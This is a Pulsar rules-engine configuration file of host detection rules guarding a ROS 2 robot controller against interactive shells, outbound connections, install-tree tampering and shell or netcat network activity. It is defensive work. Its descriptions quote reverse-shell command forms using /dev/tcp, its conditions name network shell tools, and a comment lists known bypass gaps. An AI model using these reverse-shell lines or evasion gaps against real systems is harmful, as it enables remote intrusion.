# RoboDR host rules: the ROS 2 control stack itself.
#
# Format: Pulsar rules-engine TOML (crates/modules/rules-engine/src/engine.rs).
# Deploy to /etc/pulsar/rules/robodr/ next to Pulsar's own rules. Validate with
# scripts/validate_rules.py before every deploy: ONE invalid rule anywhere under
# rules_path makes the whole rules-engine module fail to start.
#
# TUNE markers: values to set per robot during commissioning (rules/README.md).
#   /opt/ros/               ROS 2 binary install prefix (apt install of ros-<distro>-*)
#   /opt/robot_ws/install/  the robot's own colcon workspace install prefix
#
# Replaces the four rules of the former rules/robot.toml, which did not load
# (no severity/description, category "robotics") and, once loadable, would not
# have matched (header.image on Exec is the new image, not the parent; IpAddr
# has no STARTS_WITH).

[[rules]]
name = "RoboDR: Interactive shell started on robot controller"
type = "Exec"
category = "execution"
severity = "medium"
# Pulsar's argv CONTAINS matches one WHOLE argv element, so bundled short
# options must be listed one by one. The common bundles of -i with l/c/s/e/x/v/m/p
# are listed; rarer orderings (e.g. "-xvi", "-o", "--rcfile x -i" is fine) are a
# documented gap -- see rules/README.md "Bypass analysis".
description = "A shell was started with -i (interactive), alone or bundled with common short options (-il, -ic, -li, -ilc, ...). On a fielded robot controller nobody should open interactive shells; 'sh -i' / 'bash -i' is the classic reverse-shell form. Pulsar's Exec event does not carry the parent image, so this cannot be limited to shells spawned by ROS nodes; correlate header.parent_pid with the process tree in the SOC."
condition = '''
(payload.filename ENDS_WITH "/sh" OR payload.filename ENDS_WITH "/bash" OR payload.filename ENDS_WITH "/dash" OR payload.filename ENDS_WITH "/zsh" OR payload.filename ENDS_WITH "/ash" OR payload.filename ENDS_WITH "/busybox"
 OR payload.filename ENDS_WITH "/ksh" OR payload.filename ENDS_WITH "/mksh")
AND (
  payload.argv CONTAINS "-i"
  OR payload.argv CONTAINS "-il" OR payload.argv CONTAINS "-li" OR payload.argv CONTAINS "-ic" OR payload.argv CONTAINS "-ci"
  OR payload.argv CONTAINS "-is" OR payload.argv CONTAINS "-si" OR payload.argv CONTAINS "-ie" OR payload.argv CONTAINS "-ei"
  OR payload.argv CONTAINS "-ix" OR payload.argv CONTAINS "-xi" OR payload.argv CONTAINS "-iv" OR payload.argv CONTAINS "-vi"
  OR payload.argv CONTAINS "-im" OR payload.argv CONTAINS "-mi" OR payload.argv CONTAINS "-ip" OR payload.argv CONTAINS "-pi"
  OR payload.argv CONTAINS "-ilc" OR payload.argv CONTAINS "-lic" OR payload.argv CONTAINS "-lci" OR payload.argv CONTAINS "-cli"
)
'''

[[rules]]
name = "RoboDR: ROS 2 process connects outside the robot's networks"
type = "Connect"
category = "command_and_control"
severity = "high"
description = "A process running from the ROS 2 install tree or the robot workspace opened a connection to an address outside loopback, RFC 1918, link-local and IPv6 ULA/link-local space. An air-gapped robot's control stack only talks to its own cell; anything else is a C2 or exfiltration channel. Python (rclpy) nodes run as /usr/bin/python3.x and are NOT covered unless added during commissioning."
# TUNE: replace the private ranges with the robot's real cell/fleet subnets.
# IpAddr supports only ==, !=, <, >, <=, >= (no STARTS_WITH): CIDRs are written
# as inclusive ranges. In Rust's IpAddr ordering every IPv4 address sorts
# before every IPv6 address, so the v4 ranges never match a v6 address.
condition = '''
(header.image STARTS_WITH "/opt/ros/" OR header.image STARTS_WITH "/opt/robot_ws/install/")
AND NOT (
  (payload.destination.ip >= "127.0.0.0" AND payload.destination.ip <= "127.255.255.255")
  OR (payload.destination.ip >= "10.0.0.0" AND payload.destination.ip <= "10.255.255.255")
  OR (payload.destination.ip >= "172.16.0.0" AND payload.destination.ip <= "172.31.255.255")
  OR (payload.destination.ip >= "192.168.0.0" AND payload.destination.ip <= "192.168.255.255")
  OR (payload.destination.ip >= "169.254.0.0" AND payload.destination.ip <= "169.254.255.255")
  OR (payload.destination.ip >= "224.0.0.0" AND payload.destination.ip <= "239.255.255.255")
  OR payload.destination.ip == "::1"
  OR (payload.destination.ip >= "fc00::" AND payload.destination.ip <= "fdff:ffff:ffff:ffff:ffff:ffff:ffff:ffff")
  OR (payload.destination.ip >= "fe80::" AND payload.destination.ip <= "febf:ffff:ffff:ffff:ffff:ffff:ffff:ffff")
  OR (payload.destination.ip >= "ff00::" AND payload.destination.ip <= "ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff")
)
'''

[[rules]]
name = "RoboDR: ROS 2 install tree written outside the package manager"
type = "FileOpened"
category = "persistence"
severity = "high"
description = "A file under the ROS 2 install prefix or the robot workspace install tree was opened for writing by something other than dpkg (exact image /usr/bin/dpkg or /bin/dpkg; a binary merely named dpkg does not count). Nodes, launch files, parameter YAML and Python modules (including __pycache__/*.pyc) there define what the robot runs; a field write is tampering. Root-run rclpy nodes can write .pyc caches here: precompile at commissioning (python3 -m compileall) or run nodes unprivileged."
condition = '''
(payload.filename STARTS_WITH "/opt/ros/" OR payload.filename STARTS_WITH "/opt/robot_ws/install/")
AND (payload.flags CONTAINS "O_WRONLY" OR payload.flags CONTAINS "O_RDWR")
AND NOT (header.image == "/usr/bin/dpkg" OR header.image == "/bin/dpkg")
'''

[[rules]]
name = "RoboDR: File created or moved into the ROS 2 install tree outside the package manager"
type = "FileRename"
category = "persistence"
severity = "high"
description = "A file was renamed into the ROS 2 install prefix or the robot workspace install tree by something other than dpkg (exact image path) (atomic replace of a node, launch file or parameter file)."
condition = '''
(payload.destination STARTS_WITH "/opt/ros/" OR payload.destination STARTS_WITH "/opt/robot_ws/install/")
AND NOT (header.image == "/usr/bin/dpkg" OR header.image == "/bin/dpkg")
'''

[[rules]]
name = "RoboDR: Link created inside the ROS 2 install tree outside the package manager"
type = "FileLink"
category = "persistence"
severity = "high"
description = "A hard or symbolic link was created inside the ROS 2 install prefix or the robot workspace install tree by something other than dpkg. A symlink there pointing at an attacker binary makes it run under an /opt/ros/... image path, which other rules (e.g. the enclave-key reader allowlist) trust; a hard link swaps a node without a write or rename event. Pulsar FileLink: 'source' is the new link."
condition = '''
(payload.source STARTS_WITH "/opt/ros/" OR payload.source STARTS_WITH "/opt/robot_ws/install/")
AND NOT (header.image == "/usr/bin/dpkg" OR header.image == "/bin/dpkg")
'''

[[rules]]
name = "RoboDR: Shell or netcat-style tool opened a network connection"
type = "Connect"
category = "command_and_control"
severity = "high"
description = "A shell (bash, sh, dash, zsh, ksh, busybox) or a raw socket tool (nc, ncat, netcat, socat) opened a network connection. Shells only do this for reverse shells ('bash -i >& /dev/tcp/host/port 0>&1', 'exec 3<>/dev/tcp/...'), which need no -i and no extra binary, so the interactive-shell rule can miss them. Destinations inside the robot's networks are NOT excluded: an attacker on the cell network is the expected case. Pulsar's own telnet rule covers telnet."
condition = '''
header.image ENDS_WITH "/sh" OR header.image ENDS_WITH "/bash" OR header.image ENDS_WITH "/dash" OR header.image ENDS_WITH "/zsh"
OR header.image ENDS_WITH "/ksh" OR header.image ENDS_WITH "/mksh" OR header.image ENDS_WITH "/busybox"
OR header.image ENDS_WITH "/nc" OR header.image ENDS_WITH "/ncat" OR header.image ENDS_WITH "/netcat"
OR header.image ENDS_WITH "/nc.openbsd" OR header.image ENDS_WITH "/nc.traditional" OR header.image ENDS_WITH "/socat"
'''
